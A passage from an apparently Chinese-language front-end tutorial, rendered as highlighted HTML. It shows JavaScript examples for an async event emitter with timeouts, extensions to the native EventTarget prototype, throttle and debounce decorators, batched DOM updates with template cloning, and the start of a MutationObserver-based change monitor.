    <span class="hljs-keyword">const</span> timeoutPromise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">_, reject</span>) =&gt;</span> {
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Event "<span class="hljs-subst">${eventName}</span>" timeout after <span class="hljs-subst">${timeout}</span>ms`</span>)), timeout);
    });
    
    <span class="hljs-keyword">const</span> eventPromise = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emitAsync</span>(eventName, ...args);
    
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([eventPromise, timeoutPromise]);
  }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">EventSystemExample</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">createEventSystem</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> emitter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncEventEmitter</span>();
    
    <span class="hljs-comment">// 启用通配符</span>
    emitter.<span class="hljs-title function_">enableWildcard</span>();
    
    <span class="hljs-comment">// 监听所有事件</span>
    emitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">'*'</span>, <span class="hljs-function">(<span class="hljs-params">eventName, ...args</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Event "<span class="hljs-subst">${eventName}</span>" emitted with args:`</span>, args);
    });
    
    <span class="hljs-comment">// 异步事件处理</span>
    emitter.<span class="hljs-title function_">onAsync</span>(<span class="hljs-string">'user:login'</span>, <span class="hljs-keyword">async</span> (userData) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'User login event received:'</span>, userData);
      <span class="hljs-comment">// 模拟异步操作</span>
      <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-number">1000</span>));
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Login processing completed'</span>);
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> };
    });
    
    <span class="hljs-comment">// 带超时的事件触发</span>
    emitter.<span class="hljs-title function_">emitWithTimeout</span>(<span class="hljs-string">'user:login'</span>, <span class="hljs-number">2000</span>, { <span class="hljs-attr">userId</span>: <span class="hljs-number">123</span>, <span class="hljs-attr">username</span>: <span class="hljs-string">'john'</span> })
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Login successful:'</span>, result))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Login failed:'</span>, error));
    
    <span class="hljs-comment">// 链式调用</span>
    emitter.<span class="hljs-title function_">chain</span>(<span class="hljs-string">'app:start'</span>)
      .<span class="hljs-title function_">on</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'App starting...'</span>))
      .<span class="hljs-title function_">emit</span>();
    
    <span class="hljs-keyword">return</span> emitter;
  }
}
</code></pre>
<h5 data-id="heading-15">5.2 浏览器原生事件扩展</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NativeEventExtension</span> {
  <span class="hljs-comment">// 扩展EventTarget原型</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">extendEventTarget</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> originalAddEventListener = <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">addEventListener</span>;
    <span class="hljs-keyword">const</span> originalRemoveEventListener = <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">removeEventListener</span>;
    <span class="hljs-keyword">const</span> originalDispatchEvent = <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">dispatchEvent</span>;
    
    <span class="hljs-comment">// 增强addEventListener</span>
    <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">addEventListener</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">type, listener, options</span>) {
      <span class="hljs-comment">// 支持once选项</span>
      <span class="hljs-keyword">if</span> (options &amp;&amp; options.<span class="hljs-property">once</span>) {
        <span class="hljs-keyword">const</span> originalListener = listener;
        listener = <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
          originalListener.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeEventListener</span>(type, listener, options);
        };
      }
      
      <span class="hljs-comment">// 支持signal选项</span>
      <span class="hljs-keyword">if</span> (options &amp;&amp; options.<span class="hljs-property">signal</span>) {
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">abortListener</span> = (<span class="hljs-params"/>) =&gt; {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeEventListener</span>(type, listener, options);
        };
        options.<span class="hljs-property">signal</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'abort'</span>, abortListener);
        
        <span class="hljs-comment">// 修改listener以清理signal监听器</span>
        <span class="hljs-keyword">const</span> originalListener = listener;
        listener = <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
          options.<span class="hljs-property">signal</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'abort'</span>, abortListener);
          <span class="hljs-keyword">return</span> originalListener.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
        };
      }
      
      <span class="hljs-keyword">return</span> originalAddEventListener.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, type, listener, options);
    };
    
    <span class="hljs-comment">// 保持removeEventListener不变</span>
    <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">removeEventListener</span> = originalRemoveEventListener;
    
    <span class="hljs-comment">// 增强dispatchEvent</span>
    <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">dispatchEvent</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-comment">// 支持异步事件处理</span>
      <span class="hljs-keyword">if</span> (event.<span class="hljs-property">async</span>) {
        <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
          originalDispatchEvent.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, event);
        });
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      }
      
      <span class="hljs-keyword">return</span> originalDispatchEvent.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, event);
    };
    
    <span class="hljs-comment">// 添加自定义方法</span>
    <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">on</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">type, listener, options</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addEventListener</span>(type, listener, options);
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    };
    
    <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">off</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">type, listener, options</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeEventListener</span>(type, listener, options);
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    };
    
    <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">emit</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">type, detail</span>) {
      <span class="hljs-keyword">const</span> event = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(type, { detail });
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">dispatchEvent</span>(event);
    };
    
    <span class="hljs-title class_">EventTarget</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">once</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">type, listener</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addEventListener</span>(type, listener, { <span class="hljs-attr">once</span>: <span class="hljs-literal">true</span> });
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    };
  }
  
  <span class="hljs-comment">// 创建可取消的延迟事件</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">createDelayedEvent</span>(<span class="hljs-params">target, type, delay, detail</span>) {
    <span class="hljs-keyword">let</span> timeoutId = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">let</span> cancelled = <span class="hljs-literal">false</span>;
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">dispatch</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (!cancelled) {
        target.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(type, { detail }));
      }
    };
    
    timeoutId = <span class="hljs-built_in">setTimeout</span>(dispatch, delay);
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">cancel</span>: <span class="hljs-function">() =&gt;</span> {
        cancelled = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">if</span> (timeoutId) {
          <span class="hljs-built_in">clearTimeout</span>(timeoutId);
        }
      },
      <span class="hljs-attr">dispatchNow</span>: <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">if</span> (!cancelled) {
          <span class="hljs-title function_">dispatch</span>();
          <span class="hljs-keyword">if</span> (timeoutId) {
            <span class="hljs-built_in">clearTimeout</span>(timeoutId);
          }
        }
      }
    };
  }
  
  <span class="hljs-comment">// 事件节流装饰器</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">throttleEvent</span>(<span class="hljs-params">type, delay</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">target, propertyKey, descriptor</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> originalMethod = descriptor.<span class="hljs-property">value</span>;
      <span class="hljs-keyword">let</span> lastCall = <span class="hljs-number">0</span>;
      <span class="hljs-keyword">let</span> timeoutId = <span class="hljs-literal">null</span>;
      
      descriptor.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
        <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
        
        <span class="hljs-keyword">if</span> (now - lastCall &gt;= delay) {
          lastCall = now;
          originalMethod.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, event);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!timeoutId) {
          timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            lastCall = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
            originalMethod.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, event);
            timeoutId = <span class="hljs-literal">null</span>;
          }, delay - (now - lastCall));
        }
      };
      
      <span class="hljs-keyword">return</span> descriptor;
    };
  }
  
  <span class="hljs-comment">// 事件防抖装饰器</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">debounceEvent</span>(<span class="hljs-params">type, delay</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">target, propertyKey, descriptor</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> originalMethod = descriptor.<span class="hljs-property">value</span>;
      <span class="hljs-keyword">let</span> timeoutId = <span class="hljs-literal">null</span>;
      
      descriptor.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
        <span class="hljs-keyword">if</span> (timeoutId) {
          <span class="hljs-built_in">clearTimeout</span>(timeoutId);
        }
        
        timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          originalMethod.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, event);
          timeoutId = <span class="hljs-literal">null</span>;
        }, delay);
      };
      
      <span class="hljs-keyword">return</span> descriptor;
    };
  }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NativeEventExample</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">setupEnhancedEvents</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 扩展原生事件系统</span>
    <span class="hljs-title class_">NativeEventExtension</span>.<span class="hljs-title function_">extendEventTarget</span>();
    
    <span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'button'</span>);
    button.<span class="hljs-property">textContent</span> = <span class="hljs-string">'Click me'</span>;
    
    <span class="hljs-comment">// 使用新API</span>
    button
      .<span class="hljs-title function_">on</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Clicked!'</span>))
      .<span class="hljs-title function_">once</span>(<span class="hljs-string">'mouseenter'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Mouse entered (once)'</span>))
      .<span class="hljs-title function_">emit</span>(<span class="hljs-string">'custom'</span>, { <span class="hljs-attr">message</span>: <span class="hljs-string">'Hello'</span> });
    
    <span class="hljs-comment">// 使用装饰器</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Component</span> {
      @<span class="hljs-title class_">NativeEventExtension</span>.<span class="hljs-title function_">throttleEvent</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-number">100</span>)
      <span class="hljs-title function_">handleScroll</span>(<span class="hljs-params">event</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Throttled scroll:'</span>, event);
      }
      
      @<span class="hljs-title class_">NativeEventExtension</span>.<span class="hljs-title function_">debounceEvent</span>(<span class="hljs-string">'input'</span>, <span class="hljs-number">300</span>)
      <span class="hljs-title function_">handleInput</span>(<span class="hljs-params">event</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Debounced input:'</span>, event.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>);
      }
    }
    
    <span class="hljs-keyword">return</span> button;
  }
}
</code></pre>
<h4 data-id="heading-16">六、DOM操作性能优化</h4>
<h5 data-id="heading-17">6.1 批量DOM更新</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BatchDOMUpdater</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">updates</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(); <span class="hljs-comment">// Map&lt;element, {properties, children}&gt;</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rafId</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">batchSize</span> = <span class="hljs-number">50</span>; <span class="hljs-comment">// 每批处理的最大元素数量</span>
  }
  
  <span class="hljs-comment">// 计划更新</span>
  <span class="hljs-title function_">scheduleUpdate</span>(<span class="hljs-params">element, updates</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">updates</span>.<span class="hljs-title function_">has</span>(element)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">updates</span>.<span class="hljs-title function_">set</span>(element, {
        <span class="hljs-attr">properties</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(),
        <span class="hljs-attr">children</span>: <span class="hljs-literal">null</span>
      });
    }
    
    <span class="hljs-keyword">const</span> elementUpdates = <span class="hljs-variable language_">this</span>.<span class="hljs-property">updates</span>.<span class="hljs-title function_">get</span>(element);
    
    <span class="hljs-comment">// 合并属性更新</span>
    <span class="hljs-keyword">if</span> (updates.<span class="hljs-property">properties</span>) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(updates.<span class="hljs-property">properties</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
        elementUpdates.<span class="hljs-property">properties</span>.<span class="hljs-title function_">set</span>(key, value);
      });
    }
    
    <span class="hljs-comment">// 设置子节点更新</span>
    <span class="hljs-keyword">if</span> (updates.<span class="hljs-property">children</span> !== <span class="hljs-literal">undefined</span>) {
      elementUpdates.<span class="hljs-property">children</span> = updates.<span class="hljs-property">children</span>;
    }
    
    <span class="hljs-comment">// 请求动画帧进行批量更新</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">rafId</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">rafId</span> = <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">processBatch</span>());
    }
  }
  
  <span class="hljs-comment">// 处理批量更新</span>
  <span class="hljs-title function_">processBatch</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rafId</span> = <span class="hljs-literal">null</span>;
    
    <span class="hljs-comment">// 创建文档片段用于批量插入</span>
    <span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();
    <span class="hljs-keyword">const</span> elementsToUpdate = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">updates</span>.<span class="hljs-title function_">entries</span>());
    <span class="hljs-keyword">const</span> batch = elementsToUpdate.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">batchSize</span>);
    
    <span class="hljs-comment">// 应用样式和属性更新</span>
    batch.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[element, updates]</span>) =&gt;</span> {
      <span class="hljs-comment">// 批量应用样式</span>
      <span class="hljs-keyword">if</span> (updates.<span class="hljs-property">properties</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">const</span> styleUpdates = {};
        <span class="hljs-keyword">const</span> otherUpdates = {};
        
        updates.<span class="hljs-property">properties</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, key</span>) =&gt;</span> {
          <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'style'</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span>) {
            <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(element.<span class="hljs-property">style</span>, value);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'style.'</span>)) {
            <span class="hljs-keyword">const</span> styleProp = key.<span class="hljs-title function_">slice</span>(<span class="hljs-number">6</span>);
            element.<span class="hljs-property">style</span>[styleProp] = value;
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'className'</span>) {
            element.<span class="hljs-property">className</span> = value;
          } <span class="hljs-keyword">else</span> {
            otherUpdates[key] = value;
          }
        });
        
        <span class="hljs-comment">// 一次性设置其他属性</span>
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(otherUpdates).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
          element.<span class="hljs-title function_">setAttribute</span>(key, otherUpdates[key]);
        });
      }
      
      <span class="hljs-comment">// 处理子节点更新</span>
      <span class="hljs-keyword">if</span> (updates.<span class="hljs-property">children</span> !== <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 清除现有子节点</span>
        <span class="hljs-keyword">while</span> (element.<span class="hljs-property">firstChild</span>) {
          element.<span class="hljs-title function_">removeChild</span>(element.<span class="hljs-property">firstChild</span>);
        }
        
        <span class="hljs-comment">// 添加新子节点</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(updates.<span class="hljs-property">children</span>)) {
          updates.<span class="hljs-property">children</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
            <span class="hljs-keyword">if</span> (child <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Node</span>) {
              element.<span class="hljs-title function_">appendChild</span>(child);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> child === <span class="hljs-string">'string'</span>) {
              element.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(child));
            }
          });
        }
      }
    });
    
    <span class="hljs-comment">// 移除已处理的更新</span>
    batch.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[element]</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">updates</span>.<span class="hljs-title function_">delete</span>(element);
    });
    
    <span class="hljs-comment">// 如果还有剩余更新，继续处理</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">updates</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">rafId</span> = <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">processBatch</span>());
    }
  }
  
  <span class="hljs-comment">// 取消所有计划中的更新</span>
  <span class="hljs-title function_">cancel</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">rafId</span>) {
      <span class="hljs-title function_">cancelAnimationFrame</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">rafId</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">rafId</span> = <span class="hljs-literal">null</span>;
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">updates</span>.<span class="hljs-title function_">clear</span>();
  }
  
  <span class="hljs-comment">// 静态方法：快速批量创建元素</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">createElements</span>(<span class="hljs-params">tagName, count, properties = {}</span>) {
    <span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
      <span class="hljs-keyword">const</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(tagName);
      
      <span class="hljs-comment">// 应用属性</span>
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(properties).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'style'</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span>) {
          <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(element.<span class="hljs-property">style</span>, value);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'className'</span>) {
          element.<span class="hljs-property">className</span> = value;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'data-'</span>)) {
          element.<span class="hljs-title function_">setAttribute</span>(key, value);
        } <span class="hljs-keyword">else</span> {
          element[key] = value;
        }
      });
      
      fragment.<span class="hljs-title function_">appendChild</span>(element);
    }
    
    <span class="hljs-keyword">return</span> fragment;
  }
  
  <span class="hljs-comment">// 静态方法：使用模板克隆</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">cloneFromTemplate</span>(<span class="hljs-params">templateId, count, data = []</span>) {
    <span class="hljs-keyword">const</span> template = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(templateId);
    <span class="hljs-keyword">if</span> (!template || template.<span class="hljs-property">tagName</span> !== <span class="hljs-string">'TEMPLATE'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Template not found'</span>);
    }
    
    <span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
      <span class="hljs-keyword">const</span> clone = <span class="hljs-variable language_">document</span>.importNode(template.<span class="hljs-property">content</span>, <span class="hljs-literal">true</span>);
      
      <span class="hljs-comment">// 填充数据</span>
      <span class="hljs-keyword">if</span> (data[i]) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fillTemplate</span>(clone, data[i]);
      }
      
      fragment.<span class="hljs-title function_">appendChild</span>(clone);
    }
    
    <span class="hljs-keyword">return</span> fragment;
  }
  
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">fillTemplate</span>(<span class="hljs-params">node, data</span>) {
    <span class="hljs-comment">// 处理文本节点</span>
    <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">TEXT_NODE</span>) {
      <span class="hljs-keyword">const</span> text = node.<span class="hljs-property">textContent</span>;
      <span class="hljs-keyword">const</span> filledText = text.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\{\{(\w+)\}\}/g</span>, <span class="hljs-function">(<span class="hljs-params">match, key</span>) =&gt;</span> {
        <span class="hljs-keyword">return</span> data[key] || match;
      });
      
      <span class="hljs-keyword">if</span> (filledText !== text) {
        node.<span class="hljs-property">textContent</span> = filledText;
      }
    }
    
    <span class="hljs-comment">// 处理元素节点</span>
    <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">ELEMENT_NODE</span>) {
      <span class="hljs-comment">// 填充属性</span>
      <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(node.<span class="hljs-property">attributes</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">attr</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> value = attr.<span class="hljs-property">value</span>;
        <span class="hljs-keyword">const</span> filledValue = value.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\{\{(\w+)\}\}/g</span>, <span class="hljs-function">(<span class="hljs-params">match, key</span>) =&gt;</span> {
          <span class="hljs-keyword">return</span> data[key] || match;
        });
        
        <span class="hljs-keyword">if</span> (filledValue !== value) {
          node.<span class="hljs-title function_">setAttribute</span>(attr.<span class="hljs-property">name</span>, filledValue);
        }
      });
      
      <span class="hljs-comment">// 递归处理子节点</span>
      <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(node.<span class="hljs-property">childNodes</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fillTemplate</span>(child, data);
      });
    }
  }
}
</code></pre>
<h5 data-id="heading-18">6.2 使用MutationObserver监控DOM变化</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DOMChangeMonitor</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = {
      <span class="hljs-attr">childList</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">subtree</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">attributes</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">attributeOldValue</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">characterData</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">characterDataOldValue</span>: <span class="hljs-literal">true</span>,
      ...options
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationObserver</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">handleMutations</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span> = {
